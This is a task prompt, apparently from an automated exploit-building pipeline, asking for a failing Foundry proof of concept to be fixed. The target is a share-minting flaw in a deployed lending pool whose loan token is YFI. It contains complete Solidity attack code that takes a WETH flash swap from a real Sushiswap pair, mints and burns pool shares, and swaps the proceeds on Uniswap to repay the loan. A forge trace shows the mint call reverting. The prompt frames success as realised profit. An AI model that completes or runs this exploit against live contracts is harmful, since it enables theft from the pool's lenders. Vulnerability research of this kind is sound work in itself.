You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Minting trusts the requested ERC20 deposit amount instead of the amount actually received
- claim: The mint path prices shares from the caller-supplied `depositAmount` before any transfer happens, then only checks whether `transferFrom` returned success. It never measures the contract's actual balance delta, so a fee-on-transfer or otherwise deflationary `loanTokenAddress` can deliver fewer tokens than `depositAmount` while the minter still receives shares as if the full amount arrived.
- impact: An attacker can over-mint iTokens, diluting existing lenders and later redeeming more underlying than they contributed. If enough liquidity exists, this can make the pool insolvent.
- exploit_paths: ["Use a pool whose `loanTokenAddress` burns, taxes, or otherwise transfers less than the requested amount.", "Call `mint(receiver, X)` so `_safeTransferFrom` succeeds but the contract receives less than `X`.", "Receive shares computed from `X`, then burn them later for a disproportionate amount of underlying."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function withdraw(uint256 wad) external;
}

interface ILoanTokenLike {
    function loanTokenAddress() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function burn(address receiver, uint256 burnAmount) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    // Small borrow keeps both bZx price impact and AMM exit slippage low.
    uint256 internal constant FLASH_BORROW_WETH = 0.01 ether;

    ILoanTokenLike internal constant POOL = ILoanTokenLike(TARGET);

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public status;
    string public exploitPathUsed;

    address internal _profitToken;
    uint256 internal _profitAmount;

    uint256 public attackerSpendAmount;
    uint256 public poolReceiveAmount;
    uint256 public burnReturnAmount;

    address internal flashPair;
    address internal exitPair;
    address internal loanToken;
    uint256 internal flashRepayAmount;

    constructor() {
        status = "not-run";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;

        loanToken = POOL.loanTokenAddress();
        _profitToken = loanToken;

        if (loanToken == address(0) || loanToken == WETH) {
            hypothesisRefuted = true;
            status = "refuted:unsupported-loan-token";
            exploitPathUsed = "stage1-infeasible";
            return;
        }

        (flashPair, exitPair) = _selectPairs(loanToken);
        if (flashPair == address(0) || exitPair == address(0) || flashPair == exitPair) {
            hypothesisRefuted = true;
            status = "refuted:no-distinct-v2-pairs";
            exploitPathUsed = "flashswap-funding-unavailable";
            return;
        }

        uint256 balanceBefore = IERC20Like(loanToken).balanceOf(address(this));
        _startFlashswap(FLASH_BORROW_WETH);
        uint256 balanceAfter = IERC20Like(loanToken).balanceOf(address(this));

        if (balanceAfter > balanceBefore) {
            _profitAmount = balanceAfter - balanceBefore;
            hypothesisValidated = true;
            status = "validated:profit";
            exploitPathUsed = "flashswap-WETH->mint(receiver,X)-with-ETH-so-pool-receives-less-than-X-loanToken->burn-overminted-shares";
        } else {
            hypothesisRefuted = true;
            status = "refuted:no-profit";
            exploitPathUsed = "stage3-not-profitable";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == flashPair, "BAD_CALLBACK_CALLER");
        require(sender == address(this), "BAD_CALLBACK_SENDER");

        uint256 wethBorrowed = amount0 > 0 ? amount0 : amount1;
        require(wethBorrowed == FLASH_BORROW_WETH, "BAD_BORROW_AMOUNT");

        attackerSpendAmount = wethBorrowed;

        uint256 poolBalanceBefore = IERC20Like(loanToken).balanceOf(TARGET);

        IWETHLike(WETH).withdraw(wethBorrowed);

        // Flash-borrowed WETH only funds execution. The exploit causality remains:
        // mint prices shares from nominal X, the pool receives less than X loanToken,
        // then the attacker burns the over-minted shares for disproportionately high underlying.
        (bool mintOk, bytes memory mintRet) =
            TARGET.call{value: wethBorrowed}(abi.encodeWithSignature("mint(address,uint256)", address(this), wethBorrowed));
        require(mintOk, "MINT_FAILED");

        uint256 mintedShares = _decodeUint256(mintRet);
        if (mintedShares == 0) {
            mintedShares = POOL.balanceOf(address(this));
        }
        require(mintedShares != 0, "NO_SHARES_MINTED");

        uint256 poolBalanceAfterMint = IERC20Like(loanToken).balanceOf(TARGET);
        poolReceiveAmount = poolBalanceAfterMint - poolBalanceBefore;
        require(poolReceiveAmount < wethBorrowed, "NO_SHORTFALL");

        uint256 loanTokenBeforeBurn = IERC20Like(loanToken).balanceOf(address(this));
        uint256 burnedOut = POOL.burn(address(this), mintedShares);
        uint256 loanTokenAfterBurn = IERC20Like(loanToken).balanceOf(address(this));

        if (burnedOut == 0) {
            burnedOut = loanTokenAfterBurn - loanTokenBeforeBurn;
        }
        burnReturnAmount = burnedOut;
        require(burnReturnAmount != 0, "NO_BURN_RETURN");

        flashRepayAmount = _sameTokenFlashRepay(wethBorrowed);

        uint256 yfiToSell = _quoteExactOutInput(exitPair, loanToken, WETH, flashRepayAmount);
        require(yfiToSell < burnReturnAmount, "INSUFFICIENT_YFI_FOR_REPAY");

        _swapExactTokensForWETH(exitPair, loanToken, yfiToSell, flashRepayAmount);
        _safeTransfer(WETH, flashPair, flashRepayAmount);
    }

    function _selectPairs(address token) internal view returns (address flash, address exit) {
        address sushi = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(token, WETH);
        address uni = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(token, WETH);

        if (sushi != address(0) && uni != address(0) && sushi != uni) {
            return (sushi, uni);
        }
        if (uni != address(0) && sushi != address(0) && uni != sushi) {
            return (uni, sushi);
        }
        return (address(0), address(0));
    }

    function _startFlashswap(uint256 wethAmount) internal {
        (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(flashPair, WETH, wethAmount);
        IUniswapV2PairLike(flashPair).swap(amount0Out, amount1Out, address(this), hex"01");
    }

    function _swapExactTokensForWETH(address pair, address tokenIn, uint256 amountIn, uint256 minAmountOut) internal {
        _safeTransfer(tokenIn, pair, amountIn);

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        (uint256 reserveIn, uint256 reserveOut) = token0 == tokenIn ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        require(amountOut >= minAmountOut, "INSUFFICIENT_SWAP_OUT");

        (uint256 amount0Out, uint256 amount1Out) = token0 == tokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), bytes(""));
    }

    function _quoteExactOutInput(address pair, address tokenIn, address tokenOut, uint256 amountOut)
        internal
        view
        returns (uint256)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();

        require(token0 == tokenIn || token1 == tokenIn, "TOKEN_NOT_IN_PAIR");
        require(token0 == tokenOut || token1 == tokenOut, "TOKEN_OUT_NOT_IN_PAIR");

        (uint256 reserveIn, uint256 reserveOut) = token0 == tokenIn ? (reserve0, reserve1) : (reserve1, reserve0);
        return _getAmountIn(amountOut, reserveIn, reserveOut);
    }

    function _pairOutAmounts(address pair, address outToken, uint256 amountOut)
        internal
        view
        returns (uint256 amount0Out, uint256 amount1Out)
    {
        if (IUniswapV2PairLike(pair).token0() == outToken) {
            amount0Out = amountOut;
        } else {
            require(IUniswapV2PairLike(pair).token1() == outToken, "OUT_TOKEN_NOT_IN_PAIR");
            amount1Out = amountOut;
        }
    }

    function _sameTokenFlashRepay(uint256 borrowed) internal pure returns (uint256) {
        return (borrowed * 1000) / 997 + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountIn != 0 && reserveIn != 0 && reserveOut != 0, "BAD_AMM_STATE");
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut != 0 && reserveIn != 0 && reserveOut > amountOut, "BAD_AMM_STATE");
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }

    function _decodeUint256(bytes memory data) internal pure returns (uint256 value) {
        if (data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance = IERC20Like(token).allowance(address(this), spender);
        if (currentAllowance >= amount) {
            return;
        }

        (bool ok0, bytes memory ret0) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok0 && (ret0.length == 0 || abi.decode(ret0, (bool))), "APPROVE_RESET_FAILED");

        (bool ok1, bytes memory ret1) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
        require(ok1 && (ret1.length == 0 || abi.decode(ret1, (bool))), "APPROVE_SET_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.19s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 239837)
Traces:
  [239837] FlawVerifierTest::testExploit()
    ├─ [2420] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [230917] FlawVerifier::executeOnOpportunity()
    │   ├─ [2377] 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b::loanTokenAddress() [staticcall]
    │   │   └─ ← [Return] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x088ee5007C98a9677165D78dD2109AE4a3D04d0C
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x2fDbAdf3C4D5A8666Bc06645B8358ab803996E28
    │   ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2449] 0x088ee5007C98a9677165D78dD2109AE4a3D04d0C::token0() [staticcall]
    │   │   └─ ← [Return] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e
    │   ├─ [2381] 0x088ee5007C98a9677165D78dD2109AE4a3D04d0C::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [90418] 0x088ee5007C98a9677165D78dD2109AE4a3D04d0C::swap(0, 10000000000000000 [1e16], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x01)
    │   │   ├─ [29962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000 [1e16])
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000088ee5007c98a9677165d78dd2109ae4a3d04d0c
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000002386f26fc10000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [48062] FlawVerifier::uniswapV2Call(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 10000000000000000 [1e16], 0x01)
    │   │   │   ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b) [staticcall]
    │   │   │   │   └─ ← [Return] 5
    │   │   │   ├─ [9207] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(10000000000000000 [1e16])
    │   │   │   │   ├─ [67] FlawVerifier::receive{value: 10000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─  emit topic 0: 0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000002386f26fc10000
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [5461] 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b::40c10f19{value: 10000000000000000}(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000002386f26fc10000)
    │   │   │   │   ├─ [235] 0x624f7f89414011b276C60EA2337bFba936D1CbBE::40c10f19{value: 10000000000000000}(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000002386f26fc10000) [delegatecall]
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] MINT_FAILED
    │   │   └─ ← [Revert] MINT_FAILED
    │   └─ ← [Revert] MINT_FAILED
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x624f7f89414011b276C60EA2337bFba936D1CbBE
  at 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b
  at FlawVerifier.uniswapV2Call
  at 0x088ee5007C98a9677165D78dD2109AE4a3D04d0C.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 11.05s (11.04s CPU time)

Ran 1 test suite in 11.06s (11.05s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 239837)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
